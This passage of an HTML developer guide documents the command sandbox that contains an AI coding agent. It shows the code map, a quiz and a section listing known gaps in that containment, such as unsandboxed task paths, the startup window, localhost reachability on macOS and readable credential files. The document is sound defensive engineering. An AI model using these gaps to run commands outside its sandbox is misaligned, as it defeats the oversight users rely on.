+    <tr><td><span class="path">agentd/chat/controller.py</span></td><td><code>_escalation_approval_cb</code>, <code>_ask_command</code></td><td>Mode-dependent approval for escalations; the card payload carries <code>escalation</code>; remembering adds hosts to the store.</td></tr>
+    <tr><td><span class="path">agentd/chat/controller.py</span></td><td><code>_sandbox_state</code></td><td>"on", "unavailable" or "off" into <code>plan_context["sandbox"]</code>.</td></tr>
+    <tr><td><span class="path">agentd/chat/controller_prompts.py</span></td><td><code>build_controller_step_payload</code></td><td>Adds <code>sandbox_note</code> to the payload tail, so the cached system prompt never changes when you flip the switch.</td></tr>
+    <tr><td><span class="path">agentd/prompting/tagged.py</span>, <span class="path">tools/registry.py</span></td><td><code>&lt;&lt;sandbox:on&gt;&gt;</code> blocks</td><td>Sub-agents learn about the sandbox from a tagged block in their tool description.</td></tr>
+    <tr><td><span class="path">agentd/chat/controller_loop.py</span></td><td><code>_execute_batch</code> (tool results)</td><td><code>sandbox_marker(out)</code> → <code>ToolResult.sandbox</code>, broadcast in the <code>tool_result</code> event and persisted by <span class="path">chat/tool_events.py</span>.</td></tr>
+    <tr><td><span class="path">apps/vscode-extension/src/approval-mode.ts</span></td><td><code>ApprovalCoordinator</code></td><td>Sends the saved switch with every <code>setApprovalMode</code> (<code>sandboxField</code>), checks the backend agrees (<code>sandboxAgrees</code>), <code>setSandboxEnabled</code>, one "unavailable" notice per window.</td></tr>
+    <tr><td><span class="path">apps/vscode-extension/src/extension.ts</span></td><td><code>readSandboxEnabled</code></td><td>Reads <code>crucible.sandbox.enabled</code> (machine-scoped, so a repository's settings can't turn it off) and reacts to changes.</td></tr>
+    <tr><td><span class="path">apps/desktop/src/host.ts</span></td><td><code>sandboxEnabled</code>, <code>setSandboxEnabled</code></td><td>The desktop app's equivalent, stored per project.</td></tr>
+    <tr><td><span class="path">apps/desktop/src/contract.ts</span></td><td><code>parsePayload</code></td><td>Must admit the four <code>settings/…Sandbox…</code> messages and the <code>auto</code> mode; missing entries were the bug fixed on 2026-11-03.</td></tr>
+    <tr><td><span class="path">apps/vscode-extension/src/settings-data.ts</span></td><td><code>settings/sandbox</code> handlers</td><td>Call the backend's sandbox routes through editor-client and post <code>settings/sandboxState</code>.</td></tr>
+    <tr><td><span class="path">webview-ui/…/settings/sections/SandboxSection.tsx</span></td><td><code>SandboxSection</code></td><td>The switch, the host list and the extra folders.</td></tr>
+    <tr><td><span class="path">webview-ui/…/gates/CommandGate.tsx</span></td><td><code>SandboxEscalationGate</code></td><td>The "Allow network access?" / "Run outside the sandbox?" card.</td></tr>
+  </tbody>
+</table></div>
+
+<h2 id="limits">11. What it does not cover</h2>
+<p>A sandbox you overtrust is worse than none. These gaps are known and documented in <code>CLAUDE.md</code>:</p>
+<ul>
+  <li><strong>The task path</strong> (<code>ToolLoop</code>, validation commands) is not sandboxed; only chat commands and terminal sessions are.</li>
+  <li><strong>The first moments after startup</strong>, before the probe finishes, run commands unsandboxed.</li>
+  <li><strong>A nested repository</strong> a command creates (with its own <code>.git/config</code>) can still run code if VS Code's git scans it; blocking that would break <code>git clone</code>.</li>
+  <li><strong>Block detection matches text</strong>, so a failing test that prints "Name or service not known" reads as a block, and a tool that fails silently doesn't.</li>
+  <li><strong>On macOS</strong>, a server bound to <code>0.0.0.0</code> inside the wall is reachable from the machine's other addresses, and a sandboxed command can reach services on the host's <code>localhost</code>.</li>
+  <li><strong>Readable on purpose:</strong> <code>~/.npmrc</code> and <code>~/.pypirc</code> stay readable, and <code>~/.local/share/uv</code> (which holds managed Pythons) is writable.</li>
+  <li><strong>Unavailable platforms</strong> (no bubblewrap, user namespaces off, native Windows) run commands unprotected, with one notice per window and a line in the approval menu.</li>
+</ul>
+
+<h2 id="quiz">12. Check yourself</h2>
+<p class="note">Try each before opening the answer.</p>
+<div class="quiz">
+  <details>
+    <summary>Why does <code>curl http://example.com</code> count as blocked even though it exited 0?</summary>
+    <p>The proxy answered 403, and curl treats any HTTP response as success. <code>classify_block</code> therefore trusts the lease's <code>refused</code> list over the exit code: a refused host is a block whatever the command returned.</p>
+  </details>
+  <details>
+    <summary>Why aren't remembered hosts stored in the repository's <code>.crucible/</code> folder?</summary>
+    <p>Anything in the repository can arrive from a clone or be written by a command. A file there could widen the wall it is supposed to describe. The store lives under your home folder, keyed by a hash of the workspace path.</p>
+  </details>
+  <details>
+    <summary>On Linux, why does <code>git commit</code> need an escalation but not on macOS?</summary>
+    <p>Bubblewrap can't allow <code>.git/index.lock</code> while blocking a new <code>.git/commondir</code>, so <code>.git</code> is read-only apart from <code>objects</code>, <code>refs</code>, <code>logs</code> and <code>FETCH_HEAD</code>. Seatbelt can express the allowlist by regex, so macOS allows git's everyday files.</p>
+  </details>
+  <details>
+    <summary>Why does the proxy accept a request with no token at all?</summary>
+    <p>Some tools (Ubuntu's npm 9, some Java tools) drop credentials from proxy URLs. A token-less request gets only the baseline every sandboxed command already has, never a command's extra hosts, so accepting it grants nothing new. A wrong or released token is still refused.</p>
+  </details>
+  <details>
+    <summary>Why can "Allow for this workspace" remember hosts but never <code>outside_sandbox</code>?</summary>
+    <p>A host is a narrow, checkable grant. Running outside the wall removes every protection for that command, so it must be decided each time.</p>
+  </details>
+  <details>
+    <summary>You add a new protected file to Auto's always-ask list. What else do you need to change for the sandbox?</summary>
+    <p>Nothing. <code>_read_only_in()</code> reads <code>ALWAYS_ASK_IN_WORKSPACE</code> directly, both renderers consume the policy, and <code>_pinned()</code> derives its parents. One list, three consumers. That is the point of section 2.</p>
+  </details>
+</div>
+
+<footer>
+  Written from the code on <code>main</code> at <code>f05a71fa</code> (2026-11-03). Design and plan: <code>docs/superpowers/specs/2026-10-30-command-sandbox*</code> and <code>docs/superpowers/plans/2026-10-30-command-sandbox*</code>. Tests: <code>services/agentd-py/tests/test_sandbox_*</code>.
+</footer>
+</main>
+<script src="https://cdn.jsdelivr.net/npm/mermaid@10.9.1/dist/mermaid.min.js"></script>
+<script>
+  const dark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+  mermaid.initialize({ startOnLoad: true, theme: dark ? 'dark' : 'default' });
+</script>
+</body>
+</html>
